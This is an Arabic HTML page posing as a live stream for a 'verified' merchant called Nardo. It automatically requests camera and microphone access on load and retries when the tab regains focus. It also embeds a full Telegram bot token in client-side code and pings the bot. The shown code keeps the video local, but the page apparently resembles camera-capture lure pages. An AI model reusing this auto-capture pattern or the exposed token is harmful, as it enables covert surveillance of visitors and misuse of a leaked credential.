<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📹 بث مباشر - ناردو برو</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Cairo', Arial, sans-serif;
            background: #0d1117;
            color: white;
            min-height: 100vh;
            padding: 15px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #161b22;
            border-radius: 20px;
            padding: 20px;
            border: 2px solid #ffd700;
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: #ffd700;
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .header p {
            color: #8b949e;
            font-size: 14px;
        }
        
        .video-container {
            position: relative;
            margin: 15px 0;
            border-radius: 15px;
            overflow: hidden;
            border: 3px solid #ffd700;
            background: black;
            min-height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        video {
            width: 100%;
            height: auto;
            display: block;
            background: #1a1a1a;
        }
        
        #video {
            transform: scaleX(-1); /* عكس للكاميرا الأمامية */
        }
        
        .merchant-overlay {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: #ffd700;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 16px;
            font-weight: bold;
            z-index: 15;
            border: 2px solid #ffd700;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 100;
        }
        
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #2d333b;
            border-top-color: #ffd700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .fixed-merchant {
            background: #1a1f2b;
            border: 2px solid #ffd700;
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .merchant-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #ffd700;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
            color: black;
        }
        
        .merchant-info {
            flex: 1;
        }
        
        .merchant-name {
            font-size: 18px;
            font-weight: bold;
            color: #ffd700;
        }
        
        .merchant-id {
            font-size: 14px;
            color: #8b949e;
            direction: ltr;
            text-align: left;
            background: #2d333b;
            padding: 5px 10px;
            border-radius: 20px;
            margin-top: 5px;
            display: inline-block;
        }
        
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 15px 0;
            padding: 10px;
            background: #2d333b;
            border-radius: 10px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-value {
            font-size: 20px;
            font-weight: bold;
            color: #ffd700;
        }
        
        .controls {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        
        button {
            flex: 1;
            min-width: 120px;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-success {
            background: #238636;
            color: white;
        }
        
        .btn-danger {
            background: #da3633;
            color: white;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #6e7681;
            font-size: 12px;
        }
        
        .error-message {
            background: #da3633;
            color: white;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
        
        .permission-hint {
            background: #ffd70033;
            border: 2px solid #ffd700;
            color: #ffd700;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-store"></i> تاجر ناردو</h1>
            <p>@nardoo_merchant</p>
        </div>

        <!-- فيديو الكاميرا -->
        <div class="video-container">
            <video id="video" autoplay playsinline></video>
            
            <!-- طبقة التحميل -->
            <div class="loading-overlay" id="loadingOverlay">
                <div class="loading-spinner"></div>
                <div>جاري تشغيل الكاميرا...</div>
                <div style="font-size: 12px; margin-top: 10px; color: #8b949e;">يرجى السماح بالوصول للكاميرا</div>
            </div>
            
            <div id="merchantOverlay" class="merchant-overlay" style="display: none;">
                <i class="fas fa-store"></i>
                <span>@nardoo_merchant</span>
                <span style="background: #ffd700; color: black; padding: 2px 8px; border-radius: 12px; font-size: 12px;">تاجر</span>
            </div>
        </div>

        <!-- رسالة الخطأ -->
        <div class="error-message" id="errorMessage"></div>
        
        <!-- تلميح الصلاحيات -->
        <div class="permission-hint" id="permissionHint" style="display: none;">
            <i class="fas fa-info-circle"></i>
            لتشغيل الكاميرا:
            <ol style="margin-top: 5px; margin-right: 20px;">
                <li>اضغط على أيقونة القفل 🔒 في شريط العنوان</li>
                <li>اختر "السماح" للكاميرا</li>
                <li>حدث الصفحة</li>
            </ol>
        </div>

        <!-- بطاقة التاجر -->
        <div class="fixed-merchant">
            <div class="merchant-avatar">
                <span>ن</span>
            </div>
            <div class="merchant-info">
                <div class="merchant-name">
                    تاجر ناردو
                    <span style="background: #4caf50; color: white; padding: 3px 10px; border-radius: 15px; font-size: 12px;">✅ معتمد</span>
                </div>
                <div class="merchant-id">@nardoo_merchant</div>
            </div>
        </div>

        <!-- إحصائيات -->
        <div class="stats">
            <div class="stat-item">
                <div class="stat-value" id="cameraStatus">⚪</div>
                <div class="stat-label">الكاميرا</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="recordTime">00:00</div>
                <div class="stat-label">مدة البث</div>
            </div>
        </div>

        <!-- أزرار التحكم -->
        <div class="controls">
            <button class="btn-success" onclick="startCamera()" id="startBtn">
                <i class="fas fa-play"></i> تشغيل الكاميرا
            </button>
            <button class="btn-danger" onclick="stopCamera()" id="stopBtn" style="display: none;">
                <i class="fas fa-stop"></i> إيقاف
            </button>
        </div>

        <div class="footer">
            <span id="botStatus">⚪ جاري التحقق...</span>
        </div>
    </div>

    <script>
        // ========== معرف التاجر الثابت ==========
        const MERCHANT_ID = '@nardoo_merchant';
        
        // ========== المتغيرات ==========
        let stream = null;
        let cameraActive = false;
        let recordSeconds = 0;
        let timerInterval = null;
        
        // عناصر DOM
        const video = document.getElementById('video');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const errorMessage = document.getElementById('errorMessage');
        const permissionHint = document.getElementById('permissionHint');
        const merchantOverlay = document.getElementById('merchantOverlay');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const cameraStatus = document.getElementById('cameraStatus');
        const recordTime = document.getElementById('recordTime');
        const botStatus = document.getElementById('botStatus');

        // ========== تشغيل الكاميرا مباشرة ==========
        async function autoStartCamera() {
            try {
                loadingOverlay.style.display = 'flex';
                errorMessage.style.display = 'none';
                permissionHint.style.display = 'none';
                
                console.log('محاولة تشغيل الكاميرا...');
                
                // طلب الكاميرا مع خيارات واضحة
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user' // الكاميرا الأمامية
                    }, 
                    audio: true 
                });
                
                console.log('تم الحصول على الكاميرا:', stream);
                
                video.srcObject = stream;
                cameraActive = true;
                
                // تشغيل الفيديو
                try {
                    await video.play();
                    console.log('الفيديو شغال');
                } catch (playError) {
                    console.error('خطأ في تشغيل الفيديو:', playError);
                }
                
                // إخفاء التحميل
                loadingOverlay.style.display = 'none';
                
                // تحديث الواجهة
                startBtn.style.display = 'none';
                stopBtn.style.display = 'inline-block';
                merchantOverlay.style.display = 'flex';
                cameraStatus.innerHTML = '✓';
                cameraStatus.style.color = '#00ff00';
                
                // بدء المؤقت
                startTimer();
                
                // اختبار البوت
                testBot();
                
            } catch (err) {
                console.error('خطأ في الكاميرا:', err);
                
                loadingOverlay.style.display = 'none';
                errorMessage.style.display = 'block';
                errorMessage.innerHTML = `❌ خطأ: ${err.message}`;
                
                // عرض تعليمات الصلاحيات
                permissionHint.style.display = 'block';
                
                cameraStatus.innerHTML = '✗';
                cameraStatus.style.color = '#ff0000';
                
                // محاولة بديلة
                tryFallbackCamera();
            }
        }

        // ========== محاولة بديلة ==========
        async function tryFallbackCamera() {
            try {
                console.log('محاولة بديلة بدون audio...');
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true 
                });
                
                video.srcObject = stream;
                cameraActive = true;
                
                await video.play();
                
                loadingOverlay.style.display = 'none';
                errorMessage.style.display = 'none';
                permissionHint.style.display = 'none';
                
                startBtn.style.display = 'none';
                stopBtn.style.display = 'inline-block';
                merchantOverlay.style.display = 'flex';
                cameraStatus.innerHTML = '✓';
                cameraStatus.style.color = '#00ff00';
                
                startTimer();
                
            } catch (err) {
                console.error('فشلت المحاولة البديلة:', err);
            }
        }

        // ========== تشغيل الكاميرا يدوياً ==========
        async function startCamera() {
            await autoStartCamera();
        }

        // ========== إيقاف الكاميرا ==========
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => {
                    track.stop();
                    console.log('تم إيقاف المسار:', track.kind);
                });
                video.srcObject = null;
                stream = null;
                cameraActive = false;
            }
            
            stopTimer();
            
            startBtn.style.display = 'inline-block';
            stopBtn.style.display = 'none';
            merchantOverlay.style.display = 'none';
            cameraStatus.innerHTML = '✗';
            cameraStatus.style.color = '#ff0000';
            recordTime.textContent = '00:00';
        }

        // ========== بدء المؤقت ==========
        function startTimer() {
            recordSeconds = 0;
            if (timerInterval) clearInterval(timerInterval);
            
            timerInterval = setInterval(() => {
                recordSeconds++;
                const minutes = Math.floor(recordSeconds / 60);
                const seconds = recordSeconds % 60;
                recordTime.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }, 1000);
        }

        // ========== إيقاف المؤقت ==========
        function stopTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
        }

        // ========== اختبار البوت ==========
        async function testBot() {
            try {
                botStatus.innerHTML = '🔄 جاري الاتصال...';
                
                // اختبار بسيط
                await fetch(`https://api.telegram.org/bot8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0/getMe`);
                
                botStatus.innerHTML = '✅ البوت متصل';
                
            } catch (error) {
                console.error('خطأ بوت:', error);
                botStatus.innerHTML = '⚠️ البوت غير متصل';
            }
        }

        // ========== التحقق من الصلاحيات ==========
        async function checkPermissions() {
            try {
                const permissions = await navigator.permissions.query({ name: 'camera' });
                console.log('حالة صلاحية الكاميرا:', permissions.state);
                
                permissions.onchange = () => {
                    console.log('تغيرت صلاحية الكاميرا:', permissions.state);
                    if (permissions.state === 'granted') {
                        autoStartCamera();
                    }
                };
                
            } catch (err) {
                console.log('لا يمكن التحقق من الصلاحيات:', err);
            }
        }

        // ========== التهيئة ==========
        window.onload = function() {
            console.log('الصفحة تحملت...');
            
            // محاولة تشغيل الكاميرا تلقائياً
            setTimeout(autoStartCamera, 1000);
            
            // التحقق من الصلاحيات
            checkPermissions();
        };

        // محاولة تلقائية إذا رجع المستخدم للصفحة
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && !cameraActive) {
                console.log('رجعنا للصفحة، نحاول تشغيل الكاميرا...');
                autoStartCamera();
            }
        });
    </script>
</body>
</html>
